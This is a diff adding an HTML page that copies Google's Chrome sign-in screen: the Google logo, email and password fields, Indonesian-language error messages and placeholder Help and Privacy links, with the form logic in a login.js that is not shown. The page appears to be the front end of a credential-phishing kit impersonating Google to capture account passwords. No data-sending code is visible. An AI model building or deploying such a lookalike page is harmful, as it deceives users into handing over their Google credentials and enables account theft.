@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Chrome - Sign In</title>
+  <link rel="icon" type="image/png" href="Asset/icon.png">
+  <link rel="stylesheet" href="login.css">
+</head>
+<body style="background-color: #202124 !important; color: #e8eaed;">
+
+  <div id="screenShadow" class="screen-shadow hidden" style="background: rgba(0, 0, 0, 0.4);"></div>
+
+  <div id="boxStep1" class="hidden">
+    <button id="btnToStep2">Sign In</button>
+    <button id="btnStayOut">Stay out</button>
+  </div>
+
+  <div id="googleCardWrapper" class="card-wrapper">
+    <div class="google-card" style="background: #131314;">
+      
+      <div id="loadingLine" class="loading-line hidden" style="background: #202124;">
+        <div class="blue-mover" style="background: #8ab4f8;"></div>
+      </div>
+
+      <div class="card-left">
+        <svg class="google-g" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        </svg>
+
+        <h2 id="cardTitle" style="color: #e3e3e3;">Sign in</h2>
+        <p id="cardSubtitle" style="color: #c4c7c5;">to continue to Chrome</p>
+        
+        <div id="accountPill" class="account-pill hidden" style="background: #1e1f20; border: 1px solid #747775; color: #e3e3e3;">
+          <img class="avatar-mini" src="Asset/pw.png" alt="Avatar">
+          <span id="txtDisplayEmail"></span>
+          <span class="arrow-down" style="color: #9aa0a6;">▼</span>
+        </div>
+        <button id="btnBackToEmail" class="hidden" style="margin-top:10px; background:none; border:none; color:#a8c7fa; cursor:pointer;">◀ Back</button>
+      </div>
+
+      <div class="card-right-form">
+        <div class="form-slide-container">
+          
+          <div id="subStepEmail" class="slide-content">
+            <div class="input-group" id="groupEmail">
+              <input type="text" id="inputEmail" required placeholder=" " style="background: transparent; border: 1px solid #8e918f; color: #fff;" onfocus="this.style.borderColor='#a8c7fa'; this.style.borderWidth='2px';" onblur="if(!this.parentElement.classList.contains('error-mode')) { this.style.borderColor='#8e918f'; this.style.borderWidth='1px'; }">
+              <label style="color: #c4c7c5; background: #131314 !important;">Email or phone</label>
+            </div>
+            <p id="errorEmail" class="error-text hidden" style="color: #f28b82;">
+              <img src="Asset/w.png" class="error-img" alt="Alert"> 
+              Tidak dapat menemukan Akun Google Anda
+            </p>
+            <a href="#" class="link-blue" style="color: #a8c7fa;">Forgot email?</a>
+            <p class="notice-text" style="color: #9aa0a6;">Not your computer? Use Guest mode to sign in privately. <a href="#" class="link-blue" style="color: #a8c7fa;">Learn more about using Guest mode</a></p>
+          </div>
+
+          <div id="subStepPassword" class="slide-content hidden">
+            <div class="input-group" id="groupPassword">
+              <input type="password" id="inputPassword" required placeholder=" " style="background: transparent; border: 1px solid #8e918f; color: #fff;" onfocus="this.style.borderColor='#a8c7fa'; this.style.borderWidth='2px';" onblur="if(!this.parentElement.classList.contains('error-mode')) { this.style.borderColor='#8e918f'; this.style.borderWidth='1px'; }">
+              <label style="color: #c4c7c5; background: #131314 !important;">Enter your password</label>
+            </div>
+            <p id="errorPassword" class="error-text hidden" style="color: #f28b82;">
+              <img src="Asset/w.png" class="error-img" alt="Alert"> 
+              Sandi salah. Coba lagi atau klik "Lupa sandi?" untuk opsi lainnya
+            </p>
+            <div class="checkbox-group" style="color: #c4c7c5;">
+              <input type="checkbox" id="chkShowPassword">
+              <label for="chkShowPassword">Show password</label>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="form-buttons">
+          <div class="action-wrapper-right">
+            <a href="#" class="link-blue btn-side-link" id="linkCreateAccount" style="color: #a8c7fa;">Create account</a>
+            <button class="btn-next" id="btnEmailNext" style="background-color: #a8c7fa; color: #062e6f;" onmouseover="this.style.backgroundColor='#c2e7ff'" onmouseout="this.style.backgroundColor='#a8c7fa'">Next</button>
+
+            <a href="#" class="link-blue btn-side-link hidden" id="linkForgotPassword" style="color: #a8c7fa;">Forgot password?</a>
+            <button class="btn-next hidden" id="btnPasswordNext" style="background-color: #a8c7fa; color: #062e6f;" onmouseover="this.style.backgroundColor='#c2e7ff'" onmouseout="this.style.backgroundColor='#a8c7fa'">Next</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+    
+    <div class="google-footer" style="color: #ffffff;">
+      <span class="lang-selector">English (United States) ▼</span>
+      <div class="footer-links">
+        <a href="#" style="color: #ffffff;">Help</a>
+        <a href="#" style="color: #ffffff;">Privacy</a>
+        <a href="#" style="color: #ffffff;">Terms</a>
+      </div>
+    </div>
+  </div>
+
+  <script src="login.js"></script>
+</body>
+</html>
